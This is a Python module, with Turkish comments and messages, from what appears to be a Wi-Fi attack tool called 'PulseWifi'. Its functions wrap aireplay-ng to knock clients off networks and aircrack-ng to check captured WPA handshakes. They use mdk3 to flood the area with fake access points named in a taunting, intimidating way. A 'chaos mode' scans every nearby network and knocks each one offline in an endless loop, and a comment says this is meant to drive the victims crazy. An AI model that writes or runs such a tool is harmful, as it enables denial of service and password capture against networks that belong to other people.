import subprocess
import os
import random
import string
import time
from modules import radar
from modules import engine

def pulse_kick(iface, bssid, client=None, timer=0):
    print(f"\n    [*] Vuruş başlatılıyor... (Süre: {'Sınırsız' if timer==0 else str(timer)+' sn'})")
    cmd = f"sudo aireplay-ng -0 0 -a {bssid}"
    if client: cmd += f" -c {client}"
    cmd += f" {iface}"
    
    try:
        if timer > 0:
            subprocess.run(cmd, shell=True, timeout=timer)
            print("\n    [✔] Süre doldu. Vuruş durduruldu.")
        else:
            subprocess.run(cmd, shell=True)
    except subprocess.TimeoutExpired:
        print("\n    [✔] Süre doldu. Vuruş durduruldu.")
    except KeyboardInterrupt:
        print("\n    [!] Vuruş manuel iptal edildi.")

def verify_handshake(cap_file):
    print(f"\n    [*] {cap_file} analizi yapılıyor...")
    cmd = f"sudo aircrack-ng {cap_file}"
    res = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    
    if "1 handshake" in res.stdout or "WPA (1 handshake" in res.stdout:
        print("    [✔] MÜKEMMEL! Geçerli bir Handshake yakalandı.")
        return True
    else:
        print("    [✘] Handshake bulunamadı! (İpucu: Ağda bağlı kimse olmayabilir veya cihaza daha çok yaklaşman gerekebilir. Süreyi uzatarak tekrar dene.)")
        return False

def beacon_spam(iface):
    print("\n    \033[96m[*] BEACON SPAM (Sahte Ağ Yayma) MODU\033[0m")
    print("    \033[93m[1]\033[0m Varsayılan Troll Listesi (Eğlenceli İsimler)")
    print("    \033[93m[2]\033[0m Rastgele İsimler Üret (Kaos Modu)")
    print("    \033[93m[3]\033[0m Kendi .txt Dosyanı Kullan")
    
    secim = input("\n    Seçiminiz: ")
    
    spam_file = "/tmp/pulse_spam.txt"
    
    if secim == "3":
        dosya_yolu = input("    .txt dosyasının tam yolunu girin (Örn: /home/enes/isimler.txt): ")
        if not os.path.exists(dosya_yolu):
            print("    [!] Dosya bulunamadı! İşlem iptal ediliyor.")
            return
        spam_file = dosya_yolu
        print(f"    [*] {dosya_yolu} içindeki isimler kullanılıyor...")
        
    else:
        if secim == "2":
            print("    [*] Rastgele 100 adet ağ ismi üretiliyor...")
            ssids = []
            for _ in range(100):
                uzunluk = random.randint(6, 12)
                isim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=uzunluk))
                ssids.append(f"WIFI_{isim}")
                
        else:
            print("    [*] Troll listesi yükleniyor...")
            ssids = [
                "[Hacked by PulseWifi]", 
                "FBI Surveillance Van", 
                "Bedava İnternet (VIRUSLU)", 
                "Senin Wi-Fi Artik Benim", 
                "Senin değil bizim wifimiz"
                "Kacinci Katta Oturuyorsun",
                "Şuan evinin içindeyim :)",
                "Arkana bak",
                "Yan odadayımmmm",
                "TurkTelekom_5G_Test",
                "Superonline_GUEST"
            ]
        
        with open(spam_file, "w") as f:
            for isim in ssids:
                f.write(isim + "\n")
    
    print("\n    [*] Sahte ağ sinyalleri havaya basılıyor... (Durdurmak için CTRL+C)")
    try:
        cmd = f"sudo mdk3 {iface} b -f {spam_file} -a -s 1000"
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print("\n    [✔] Spam durduruldu. Hava sahası temizlendi.")
    except Exception as e:
        print("\n    [✘] Hata: 'mdk3' aracı eksik olabilir. (Terminalde: sudo apt install mdk3 yazarak kur)")

# ==========================================
# YENİ: CHAOS MODU (OTOMATİK VUR-KAÇ DÖNGÜSÜ)
# ==========================================
def chaos_mode(iface):
    print("\n    \033[91m\033[1m[!] CHAOS MODU AKTİF EDİLDİ [!]\033[0m")
    print("    \033[91m[*] Sistem: Etraftaki tüm ağları listeleyecek ve sırayla şok dalgası yollayacak.\033[0m")
    print("    \033[91m[*] Taktik: Herkese uğrayıp döngüyü başa saracak (Adamlar tam bağlanırken yine düşecek).\033[0m")
    print("    \033[91m[*] (Durdurmak için CTRL+C)\033[0m")
    time.sleep(2)
    
    try:
        # Önce kurban listesini çıkarıyoruz (Döngü dışında bir kere tarasın ki vakit kaybetmeyelim)
        print("\n    [*] Çevre taranıyor, hedefler belirleniyor... (10 Saniye)")
        networks = radar.auto_scan_and_select(iface, scan_time=10)
        
        if not networks:
            print("    [!] Etrafta ağ bulunamadı. Lütfen daha sonra tekrar deneyin.")
            return
            
        print(f"    [✔] Toplam {len(networks)} hedef kilitlendi. Zıplama motoru ateşleniyor!\n")
        time.sleep(1)
        
        tur_sayisi = 1
        while True:
            print(f"\n    \033[93m--- [ TUR {tur_sayisi} BAŞLADI ] ---\033[0m")
            
            for net in networks:
                # Terminal çok kirlenmesin diye tek satırda bilgi veriyoruz
                print(f"    [>] Şok Dalgası: {net['essid'][:15]:<15} | Kanal: {net['ch']} | BSSID: {net['bssid']}")
                
                # Kartın kanalını hedefin kanalına çevir
                engine.run_cmd(f"sudo iwconfig {iface} channel {net['ch']}")
                
                # 20 adet mermi fırlat (Yaklaşık 2-3 saniye sürer)
                cmd = f"sudo aireplay-ng -0 20 -a {net['bssid']} {iface}"
                subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
            print(f"    \033[93m--- [ TUR {tur_sayisi} BİTTİ - BAŞA SARILIYOR ] ---\033[0m")
            tur_sayisi += 1
            # İstersen buraya time.sleep(10) ekleyip tur aralarında bekleme yapabilirsin
            # Ama hiç beklemeden başa sarmak adamları daha çok çıldırtır :)
            
    except KeyboardInterrupt:
        print("\n    \033[92m[✔] Chaos Modu durduruldu. Hava sahası normale döndü.\033[0m")